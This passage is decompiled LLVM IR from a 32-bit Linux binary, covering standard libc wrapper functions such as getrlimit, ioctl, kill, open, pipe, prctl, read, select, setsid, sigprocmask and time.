  %v0_805096f = load i32, i32* @ebx, align 4
  %v1_805096f = sub i32 0, %v0_805096f
  store i32 %v1_805096f, i32* @ebx, align 4
  %v2_8050971 = inttoptr i32 %v1_805096a to i32*
  store i32 %v1_805096f, i32* %v2_8050971, align 4
  br label %dec_label_pc_8050997

dec_label_pc_8050975:                             ; preds = %dec_label_pc_8050952
  %v2_8050975 = icmp slt i32 %v2_805095d, 0
  br i1 %v2_8050975, label %dec_label_pc_8050997, label %dec_label_pc_8050979

dec_label_pc_8050979:                             ; preds = %dec_label_pc_8050975
  %v0_8050979 = load i32, i32* @edi, align 4
  %v1_8050979 = icmp eq i32 %v0_8050979, 0
  %v1_805097b = icmp eq i1 %v1_8050979, false
  br i1 %v1_805097b, label %dec_label_pc_80509ab, label %dec_label_pc_805097d

dec_label_pc_805097d:                             ; preds = %dec_label_pc_8050979
  br i1 %v1_805090d, label %dec_label_pc_8050993, label %dec_label_pc_8050981

dec_label_pc_8050981:                             ; preds = %dec_label_pc_805097d
  %v0_8050984 = load i32, i32* @esi, align 4
  store i32 %v0_8050984, i32* %stack_var_-44, align 4
  %v4_8050985 = inttoptr i32 %v0_8050984 to i32*
  %v5_8050985 = call i32 @realloc(i32* %v4_8050985, i32 %v2_805095d, i32 %v0_805095f, i32 %v0_805095f)
  %v1_805098f = icmp eq i32 %v5_8050985, 0
  %v1_8050991 = icmp eq i1 %v1_805098f, false
  br i1 %v1_8050991, label %dec_label_pc_80509ab, label %dec_label_pc_8050993

dec_label_pc_8050993:                             ; preds = %dec_label_pc_8050981, %dec_label_pc_805097d
  %v0_8050993 = load i32, i32* @esi, align 4
  br label %dec_label_pc_80509ab

dec_label_pc_8050997:                             ; preds = %dec_label_pc_8050975, %dec_label_pc_805096a
  %v0_8050997 = load i32, i32* @edi, align 4
  %v1_8050997 = icmp eq i32 %v0_8050997, 0
  %v1_8050999 = icmp eq i1 %v1_8050997, false
  br i1 %v1_8050999, label %dec_label_pc_80509a9, label %dec_label_pc_805099b

dec_label_pc_805099b:                             ; preds = %dec_label_pc_8050997
  %v0_805099e = load i32, i32* @esi, align 4
  store i32 %v0_805099e, i32* %stack_var_-44, align 4
  %v1_805099f = call i32 @free(i32 %v0_805099e)
  %v0_80509ae.pre = load i32, i32* @edi, align 4
  br label %dec_label_pc_80509ab

dec_label_pc_80509a9:                             ; preds = %dec_label_pc_8050997, %dec_label_pc_8050940, %dec_label_pc_8050913
  br label %dec_label_pc_80509ab

dec_label_pc_80509ab:                             ; preds = %dec_label_pc_8050981, %dec_label_pc_8050979, %dec_label_pc_805099b, %dec_label_pc_8050993, %dec_label_pc_80509a9
  %v0_80509ae = phi i32 [ %v5_8050985, %dec_label_pc_8050981 ], [ %v0_8050979, %dec_label_pc_8050979 ], [ %v0_80509ae.pre, %dec_label_pc_805099b ], [ %v0_8050993, %dec_label_pc_8050993 ], [ 0, %dec_label_pc_80509a9 ]
  store i32 %v0_80508ff, i32* @ebx, align 4
  store i32 %v0_80508fe, i32* @esi, align 4
  store i32 %v0_80508fd, i32* @edi, align 4
  store i32 %v0_80508fc, i32* @ebp, align 4
  ret i32 %v0_80509ae

; uselistorder directives
  uselistorder i32 %v2_805095d, { 1, 2, 0, 3 }
  uselistorder i32 %v1_8050944, { 0, 2, 1 }
  uselistorder i32 %v0_8050943, { 1, 0 }
  uselistorder i32* %stack_var_-44, { 3, 4, 2, 0, 5, 1 }
  uselistorder i32 (i32, i32)* @getcwd, { 1, 0 }
  uselistorder i32 %arg2, { 0, 1, 3, 2 }
  uselistorder i32 %arg1, { 0, 2, 1, 3, 4 }
  uselistorder label %dec_label_pc_80509ab, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_8050940, { 1, 2, 0 }
}

define i32 @getdtablesize() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v2_80509bb = ptrtoint i32* %stack_var_-8 to i32
  %v2_80509c2 = call i32 @getrlimit(i32 7, i32 %v2_80509bb)
  store i32 256, i32* @edx, align 4
  %v2_80509cf = icmp slt i32 %v2_80509c2, 0
  br i1 %v2_80509cf, label %dec_label_pc_80509d7, label %dec_label_pc_80509d3

dec_label_pc_80509d3:                             ; preds = %entry
  %v3_80509d3 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_80509d3, i32* @edx, align 4
  br label %dec_label_pc_80509d7

dec_label_pc_80509d7:                             ; preds = %entry, %dec_label_pc_80509d3
  %v0_80509d7 = phi i32 [ 256, %entry ], [ %v3_80509d3, %dec_label_pc_80509d3 ]
  ret i32 %v0_80509d7

; uselistorder directives
  uselistorder label %dec_label_pc_80509d7, { 1, 0 }
}

define i32 @__GI_getpagesize(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v0_80509e0 = load i32, i32* @global_var_8061770.465, align 16
  %v1_80509ea = icmp eq i32 %v0_80509e0, 0
  br i1 %v1_80509ea, label %dec_label_pc_80509f0, label %dec_label_pc_80509ee

dec_label_pc_80509ee:                             ; preds = %entry
  br label %dec_label_pc_80509f0

dec_label_pc_80509f0:                             ; preds = %entry, %dec_label_pc_80509ee
  %storemerge = phi i32 [ %v0_80509e0, %dec_label_pc_80509ee ], [ 4096, %entry ]
  %v0_80509f0 = phi i32 [ %v0_80509e0, %dec_label_pc_80509ee ], [ 4096, %entry ]
  store i32 %storemerge, i32* @edx, align 4
  ret i32 %v0_80509f0

; uselistorder directives
  uselistorder label %dec_label_pc_80509f0, { 1, 0 }
}

define i32 @__libc_getpid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_80509f4 = load i32, i32* @ebx, align 4
  store i32 %v0_80509f4, i32* %stack_var_-4, align 4
  %v1_80509fd = call i32 @getpid(i32 %v0_80509f4)
  store i32 %v1_80509fd, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_80509fd, -4095
  br i1 %tmp6, label %dec_label_pc_8050a14, label %dec_label_pc_8050a08

dec_label_pc_8050a08:                             ; preds = %entry
  %v0_8050a08 = load i32, i32* %stack_var_-4, align 4
  %v1_8050a08 = call i32 @__errno_location(i32 %v0_8050a08)
  %v0_8050a0d = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050a0d = sub i32 0, %v0_8050a0d
  %v2_8050a0f = inttoptr i32 %v1_8050a08 to i32*
  store i32 %v1_8050a0d, i32* %v2_8050a0f, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050a14

dec_label_pc_8050a14:                             ; preds = %entry, %dec_label_pc_8050a08
  %v0_8050a14 = phi i32 [ %v1_80509fd, %entry ], [ -1, %dec_label_pc_8050a08 ]
  %v2_8050a18 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050a18, i32* @ebx, align 4
  ret i32 %v0_8050a14

; uselistorder directives
  uselistorder i32 %v1_80509fd, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050a14, { 1, 0 }
}

define i32 @getrlimit(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050a1c = load i32, i32* @ebx, align 4
  store i32 %v0_8050a1c, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %ebx.global-to-local, align 4
  %v1_8050a2f = call i32 @int80_syscall(i32 191)
  store i32 %v1_8050a2f, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v1_8050a2f, -4095
  br i1 %tmp8, label %dec_label_pc_8050a48, label %dec_label_pc_8050a3c

dec_label_pc_8050a3c:                             ; preds = %entry
  %v0_8050a3c = load i32, i32* %stack_var_-4, align 4
  %v1_8050a3c = call i32 @__errno_location(i32 %v0_8050a3c)
  %v0_8050a41 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050a41 = sub i32 0, %v0_8050a41
  %v2_8050a43 = inttoptr i32 %v1_8050a3c to i32*
  store i32 %v1_8050a41, i32* %v2_8050a43, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050a48

dec_label_pc_8050a48:                             ; preds = %entry, %dec_label_pc_8050a3c
  %v0_8050a48 = phi i32 [ %v1_8050a2f, %entry ], [ -1, %dec_label_pc_8050a3c ]
  %v2_8050a4c = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050a4c, i32* @ebx, align 4
  ret i32 %v0_8050a48

; uselistorder directives
  uselistorder i32 %v1_8050a2f, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder i32 191, { 1, 0 }
  uselistorder label %dec_label_pc_8050a48, { 1, 0 }
}

define i32 @ioctl(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp9 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_8050a50 = load i32, i32* @edi, align 4
  store i32 %v0_8050a50, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @edi, align 4
  %v0_8050a68 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v3_8050a70 = call i32 @ioctl(i32 %v0_8050a68, i32 %tmp9, i32 ptrtoint (i32* @0 to i32))
  store i32 %v0_8050a68, i32* @ebx, align 4
  store i32 %v3_8050a70, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v3_8050a70, -4095
  br i1 %tmp11, label %dec_label_pc_8050a88, label %dec_label_pc_8050a7c

dec_label_pc_8050a7c:                             ; preds = %entry
  %v1_8050a7c = call i32 @__errno_location(i32 %v0_8050a68)
  %v0_8050a81 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050a81 = sub i32 0, %v0_8050a81
  %v2_8050a83 = inttoptr i32 %v1_8050a7c to i32*
  store i32 %v1_8050a81, i32* %v2_8050a83, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050a88

dec_label_pc_8050a88:                             ; preds = %entry, %dec_label_pc_8050a7c
  %v0_8050a88 = phi i32 [ %v3_8050a70, %entry ], [ -1, %dec_label_pc_8050a7c ]
  %v2_8050a8d = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050a8d, i32* @edi, align 4
  ret i32 %v0_8050a88

; uselistorder directives
  uselistorder i32 %v3_8050a70, { 1, 0, 2 }
  uselistorder i32 %v0_8050a68, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050a88, { 1, 0 }
}

define i32 @kill(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050a90 = load i32, i32* @ebx, align 4
  store i32 %v0_8050a90, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v2_8050aa3 = call i32 @kill(i32 %v0_8050a90, i32 %tmp4)
  store i32 %v2_8050aa3, i32* %ebx.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_8050aa3, -4095
  br i1 %tmp8, label %dec_label_pc_8050abc, label %dec_label_pc_8050ab0

dec_label_pc_8050ab0:                             ; preds = %entry
  %v0_8050ab0 = load i32, i32* %stack_var_-4, align 4
  %v1_8050ab0 = call i32 @__errno_location(i32 %v0_8050ab0)
  %v0_8050ab5 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050ab5 = sub i32 0, %v0_8050ab5
  %v2_8050ab7 = inttoptr i32 %v1_8050ab0 to i32*
  store i32 %v1_8050ab5, i32* %v2_8050ab7, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050abc

dec_label_pc_8050abc:                             ; preds = %entry, %dec_label_pc_8050ab0
  %v0_8050abc = phi i32 [ %v2_8050aa3, %entry ], [ -1, %dec_label_pc_8050ab0 ]
  %v2_8050abe = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050abe, i32* @edx, align 4
  %v2_8050ac0 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050ac0, i32* @ebx, align 4
  ret i32 %v0_8050abc

; uselistorder directives
  uselistorder i32 %v2_8050aa3, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050abc, { 1, 0 }
}

define i32 @__libc_open(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %tmp = call i32 @__decompiler_undefined_function_0()
  %v0_8050ac5 = load i32, i32* @ebx, align 4
  %sext = mul i32 %arg2, 16777216
  %v4_8050acb = sdiv i32 %sext, 16777216
  store i32 %v4_8050acb, i32* @ecx, align 4
  %v4_8050acf = ptrtoint i8* %arg1 to i32
  %v3_8050ad3 = and i32 %arg2, 64
  %v4_8050ad3 = icmp eq i32 %v3_8050ad3, 0
  br i1 %v4_8050ad3, label %dec_label_pc_8050ae4, label %dec_label_pc_8050ad8

dec_label_pc_8050ad8:                             ; preds = %entry
  %phitmp = urem i32 %tmp, 65536
  br label %dec_label_pc_8050ae4

dec_label_pc_8050ae4:                             ; preds = %entry, %dec_label_pc_8050ad8
  %v0_8050ae4 = phi i32 [ 0, %entry ], [ %phitmp, %dec_label_pc_8050ad8 ]
  store i32 %v0_8050ae4, i32* @edx, align 4
  store i32 %v4_8050acf, i32* %ebx.global-to-local, align 4
  %v5_8050aef = call i32 (i8*, i32, ...) @open(i8* %arg1, i32 %v4_8050acb)
  store i32 %v5_8050aef, i32* %ebx.global-to-local, align 4
  %tmp15 = icmp ult i32 %v5_8050aef, -4095
  br i1 %tmp15, label %dec_label_pc_8050b07, label %dec_label_pc_8050afb

dec_label_pc_8050afb:                             ; preds = %dec_label_pc_8050ae4
  %v1_8050afb = call i32 @__errno_location(i32 %v0_8050ac5)
  %v0_8050b00 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050b00 = sub i32 0, %v0_8050b00
  %v2_8050b02 = inttoptr i32 %v1_8050afb to i32*
  store i32 %v1_8050b00, i32* %v2_8050b02, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050b07

dec_label_pc_8050b07:                             ; preds = %dec_label_pc_8050ae4, %dec_label_pc_8050afb
  %v0_8050b07 = phi i32 [ %v5_8050aef, %dec_label_pc_8050ae4 ], [ -1, %dec_label_pc_8050afb ]
  store i32 %v0_8050ac5, i32* @ebx, align 4
  ret i32 %v0_8050b07

; uselistorder directives
  uselistorder i32 %v5_8050aef, { 1, 0, 2 }
  uselistorder i32 %v4_8050acb, { 1, 0 }
  uselistorder i32 %v0_8050ac5, { 1, 0 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_8050b07, { 1, 0 }
  uselistorder label %dec_label_pc_8050ae4, { 1, 0 }
}

define i32 @__libc_creat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_8050b1f = inttoptr i32 %arg1 to i8*
  %v4_8050b1f = call i32 @__libc_open(i8* %v3_8050b1f, i32 577)
  ret i32 %v4_8050b1f
}

define i32 @__GI_pipe(i32 %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050b28 = load i32, i32* @edi, align 4
  store i32 %v0_8050b28, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8050b30 = load i32, i32* @ebx, align 4
  %v1_8050b38 = insertvalue [2 x i32] undef, i32 %arg1, 0
  %v2_8050b38 = call i32 @pipe([2 x i32] %v1_8050b38)
  store i32 %v0_8050b30, i32* @ebx, align 4
  store i32 %v2_8050b38, i32* %edi.global-to-local, align 4
  %tmp8 = icmp ult i32 %v2_8050b38, -4095
  br i1 %tmp8, label %dec_label_pc_8050b50, label %dec_label_pc_8050b44

dec_label_pc_8050b44:                             ; preds = %entry
  %v1_8050b44 = call i32 @__errno_location(i32 %v0_8050b30)
  %v0_8050b49 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050b49 = sub i32 0, %v0_8050b49
  %v2_8050b4b = inttoptr i32 %v1_8050b44 to i32*
  store i32 %v1_8050b49, i32* %v2_8050b4b, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050b50

dec_label_pc_8050b50:                             ; preds = %entry, %dec_label_pc_8050b44
  %v0_8050b50 = phi i32 [ %v2_8050b38, %entry ], [ -1, %dec_label_pc_8050b44 ]
  %v2_8050b54 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050b54, i32* @edi, align 4
  ret i32 %v0_8050b50

; uselistorder directives
  uselistorder i32 %v2_8050b38, { 1, 0, 2 }
  uselistorder i32 %v0_8050b30, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050b50, { 1, 0 }
}

define i32 @prctl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-8 = alloca i32, align 4
  %v0_8050b58 = load i32, i32* @edi, align 4
  %v0_8050b59 = load i32, i32* @esi, align 4
  store i32 %v0_8050b59, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* @esi, align 4
  store i32 %arg5, i32* @edi, align 4
  %v0_8050b71 = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v5_8050b79 = call i32 @prctl(i32 %v0_8050b71, i32 %v0_8050b59, i32 %v0_8050b58, i32 %tmp6, i32 %arg1)
  store i32 %v0_8050b71, i32* @ebx, align 4
  store i32 %v5_8050b79, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v5_8050b79, -4095
  br i1 %tmp11, label %dec_label_pc_8050b91, label %dec_label_pc_8050b85

dec_label_pc_8050b85:                             ; preds = %entry
  %v1_8050b85 = call i32 @__errno_location(i32 %v0_8050b71)
  %v0_8050b8a = load i32, i32* %esi.global-to-local, align 4
  %v1_8050b8a = sub i32 0, %v0_8050b8a
  %v2_8050b8c = inttoptr i32 %v1_8050b85 to i32*
  store i32 %v1_8050b8a, i32* %v2_8050b8c, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050b91

dec_label_pc_8050b91:                             ; preds = %entry, %dec_label_pc_8050b85
  %v0_8050b91 = phi i32 [ %v5_8050b79, %entry ], [ -1, %dec_label_pc_8050b85 ]
  %v2_8050b94 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050b94, i32* @esi, align 4
  store i32 %v0_8050b58, i32* @edi, align 4
  ret i32 %v0_8050b91

; uselistorder directives
  uselistorder i32 %v5_8050b79, { 1, 0, 2 }
  uselistorder i32 %v0_8050b71, { 1, 0, 2 }
  uselistorder i32 (i32, i32, i32, i32, i32)* @prctl, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8050b91, { 1, 0 }
}

define i32 @__libc_read(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050b98 = load i32, i32* @edi, align 4
  store i32 %v0_8050b98, i32* %stack_var_-4, align 4
  store i32 %arg1, i32* %edi.global-to-local, align 4
  %v0_8050ba8 = load i32, i32* @ebx, align 4
  %v4_8050bb0 = call i32 @read(i32 %arg1, i32* %arg2, i32 %arg3)
  store i32 %v0_8050ba8, i32* @ebx, align 4
  store i32 %v4_8050bb0, i32* %edi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v4_8050bb0, -4095
  br i1 %tmp11, label %dec_label_pc_8050bc8, label %dec_label_pc_8050bbc

dec_label_pc_8050bbc:                             ; preds = %entry
  %v1_8050bbc = call i32 @__errno_location(i32 %v0_8050ba8)
  %v0_8050bc1 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050bc1 = sub i32 0, %v0_8050bc1
  %v2_8050bc3 = inttoptr i32 %v1_8050bbc to i32*
  store i32 %v1_8050bc1, i32* %v2_8050bc3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050bc8

dec_label_pc_8050bc8:                             ; preds = %entry, %dec_label_pc_8050bbc
  %v0_8050bc8 = phi i32 [ %v4_8050bb0, %entry ], [ -1, %dec_label_pc_8050bbc ]
  %v2_8050bcc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050bcc, i32* @edi, align 4
  ret i32 %v0_8050bc8

; uselistorder directives
  uselistorder i32 %v4_8050bb0, { 1, 0, 2 }
  uselistorder i32 %v0_8050ba8, { 1, 0 }
  uselistorder label %dec_label_pc_8050bc8, { 1, 0 }
}

define i32 @__libc_select(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8050bd1 = load i32, i32* @esi, align 4
  store i32 %v0_8050bd1, i32* %stack_var_-8, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v0_8050be9 = load i32, i32* @ebx, align 4
  %v1_8050bf1 = call i32 @int80_syscall(i32 142)
  store i32 %v0_8050be9, i32* @ebx, align 4
  store i32 %v1_8050bf1, i32* %esi.global-to-local, align 4
  %tmp11 = icmp ult i32 %v1_8050bf1, -4095
  br i1 %tmp11, label %dec_label_pc_8050c09, label %dec_label_pc_8050bfd

dec_label_pc_8050bfd:                             ; preds = %entry
  %v1_8050bfd = call i32 @__errno_location(i32 %v0_8050be9)
  %v0_8050c02 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050c02 = sub i32 0, %v0_8050c02
  %v2_8050c04 = inttoptr i32 %v1_8050bfd to i32*
  store i32 %v1_8050c02, i32* %v2_8050c04, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050c09

dec_label_pc_8050c09:                             ; preds = %entry, %dec_label_pc_8050bfd
  %v0_8050c09 = phi i32 [ %v1_8050bf1, %entry ], [ -1, %dec_label_pc_8050bfd ]
  %v2_8050c0b = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050c0b, i32* @edx, align 4
  %v2_8050c0c = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_8050c0c, i32* @esi, align 4
  ret i32 %v0_8050c09

; uselistorder directives
  uselistorder i32 %v1_8050bf1, { 1, 0, 2 }
  uselistorder i32 %v0_8050be9, { 1, 0 }
  uselistorder i32 142, { 1, 0 }
  uselistorder label %dec_label_pc_8050c09, { 1, 0 }
}

define i32 @__GI_setsid() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050c10 = load i32, i32* @ebx, align 4
  store i32 %v0_8050c10, i32* %stack_var_-4, align 4
  %v1_8050c19 = call i32 @setsid(i32 %v0_8050c10)
  store i32 %v1_8050c19, i32* %ebx.global-to-local, align 4
  %tmp6 = icmp ult i32 %v1_8050c19, -4095
  br i1 %tmp6, label %dec_label_pc_8050c30, label %dec_label_pc_8050c24

dec_label_pc_8050c24:                             ; preds = %entry
  %v0_8050c24 = load i32, i32* %stack_var_-4, align 4
  %v1_8050c24 = call i32 @__errno_location(i32 %v0_8050c24)
  %v0_8050c29 = load i32, i32* %ebx.global-to-local, align 4
  %v1_8050c29 = sub i32 0, %v0_8050c29
  %v2_8050c2b = inttoptr i32 %v1_8050c24 to i32*
  store i32 %v1_8050c29, i32* %v2_8050c2b, align 4
  store i32 -1, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8050c30

dec_label_pc_8050c30:                             ; preds = %entry, %dec_label_pc_8050c24
  %v0_8050c30 = phi i32 [ %v1_8050c19, %entry ], [ -1, %dec_label_pc_8050c24 ]
  %v2_8050c34 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050c34, i32* @ebx, align 4
  ret i32 %v0_8050c30

; uselistorder directives
  uselistorder i32 %v1_8050c19, { 1, 0, 2 }
  uselistorder i32* %stack_var_-4, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8050c30, { 1, 0 }
}

define i32 @__GI_sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %esi.global-to-local = alloca i32, align 4
  %tmp3 = inttoptr i32 %arg3 to %_TYPEDEF_sigset_t*
  %stack_var_-12 = alloca i32, align 4
  %v0_8050c39 = load i32, i32* @esi, align 4
  %v4_8050c3d = ptrtoint %_TYPEDEF_sigset_t* %arg2 to i32
  store i32 %v4_8050c3d, i32* @ecx, align 4
  %v2_8050c49 = icmp eq %_TYPEDEF_sigset_t* %arg2, null
  br i1 %v2_8050c49, label %dec_label_pc_8050c62, label %dec_label_pc_8050c4d

dec_label_pc_8050c4d:                             ; preds = %entry
  %tmp11 = icmp ult i32 %arg1, 3
  br i1 %tmp11, label %dec_label_pc_8050c62, label %dec_label_pc_8050c52

dec_label_pc_8050c52:                             ; preds = %dec_label_pc_8050c4d
  %v1_8050c52 = call i32 @__errno_location(i32 %v0_8050c39)
  %v1_8050c57 = inttoptr i32 %v1_8050c52 to i32*
  store i32 22, i32* %v1_8050c57, align 4
  br label %dec_label_pc_8050c89

dec_label_pc_8050c62:                             ; preds = %dec_label_pc_8050c4d, %entry
  store i32 8, i32* %esi.global-to-local, align 4
  %v0_8050c67 = load i32, i32* @ebx, align 4
  %v7_8050c6f = call i32 @sigprocmask(i32 %arg1, %_TYPEDEF_sigset_t* %arg2, %_TYPEDEF_sigset_t* %tmp3)
  store i32 %v0_8050c67, i32* @ebx, align 4
  store i32 %v7_8050c6f, i32* %esi.global-to-local, align 4
  %tmp12 = icmp ult i32 %v7_8050c6f, -4095
  br i1 %tmp12, label %dec_label_pc_8050c89, label %dec_label_pc_8050c7b

dec_label_pc_8050c7b:                             ; preds = %dec_label_pc_8050c62
  %v1_8050c7b = call i32 @__errno_location(i32 %v0_8050c67)
  %v0_8050c80 = load i32, i32* %esi.global-to-local, align 4
  %v1_8050c80 = sub i32 0, %v0_8050c80
  %v2_8050c82 = inttoptr i32 %v1_8050c7b to i32*
  store i32 %v1_8050c80, i32* %v2_8050c82, align 4
  store i32 -1, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8050c89

dec_label_pc_8050c89:                             ; preds = %dec_label_pc_8050c7b, %dec_label_pc_8050c62, %dec_label_pc_8050c52
  %storemerge = phi i32 [ -1, %dec_label_pc_8050c52 ], [ %v7_8050c6f, %dec_label_pc_8050c62 ], [ -1, %dec_label_pc_8050c7b ]
  %v2_8050c89 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050c89, i32* @edx, align 4
  store i32 %v0_8050c39, i32* @esi, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v7_8050c6f, { 1, 0, 2 }
  uselistorder i32 %v0_8050c67, { 1, 0 }
  uselistorder %_TYPEDEF_sigset_t* %arg2, { 1, 0, 2 }
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @__GI_time(i32* %arg1) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %tmp3 = ptrtoint i32* %arg1 to i32
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050c90 = load i32, i32* @edi, align 4
  store i32 %v0_8050c90, i32* %stack_var_-4, align 4
  store i32 %tmp3, i32* %edi.global-to-local, align 4
  %v0_8050c98 = load i32, i32* @ebx, align 4
  %v2_8050ca0 = call i32 @time(i32* %arg1)
  store i32 %v0_8050c98, i32* @ebx, align 4
  store i32 %v2_8050ca0, i32* %edi.global-to-local, align 4
  %tmp9 = icmp ult i32 %v2_8050ca0, -4095
  br i1 %tmp9, label %dec_label_pc_8050cb8, label %dec_label_pc_8050cac

dec_label_pc_8050cac:                             ; preds = %entry
  %v1_8050cac = call i32 @__errno_location(i32 %v0_8050c98)
  %v0_8050cb1 = load i32, i32* %edi.global-to-local, align 4
  %v1_8050cb1 = sub i32 0, %v0_8050cb1
  %v2_8050cb3 = inttoptr i32 %v1_8050cac to i32*
  store i32 %v1_8050cb1, i32* %v2_8050cb3, align 4
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8050cb8

dec_label_pc_8050cb8:                             ; preds = %entry, %dec_label_pc_8050cac
  %v0_8050cb8 = phi i32 [ %v2_8050ca0, %entry ], [ -1, %dec_label_pc_8050cac ]
  %v2_8050cba = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_8050cba, i32* @edx, align 4
  %v2_8050cbc = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8050cbc, i32* @edi, align 4
  ret i32 %v0_8050cb8

; uselistorder directives
  uselistorder i32 %v2_8050ca0, { 1, 0, 2 }
  uselistorder i32 %v0_8050c98, { 1, 0 }
  uselistorder label %dec_label_pc_8050cb8, { 1, 0 }
}

define i32 @__libc_waitpid(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %v4_8050cd1 = call i32 @wait4(i32 %arg1, i32 %arg2, i32 %arg3, i32 0)
  ret i32 %v4_8050cd1
}

define i32 @__libc_write(i32 %arg1, i32* %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %edi.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8050cdc = load i32, i32* @edi, align 4
  store i32 %v0_8050cdc, i32* %stack_var_-4, align 4
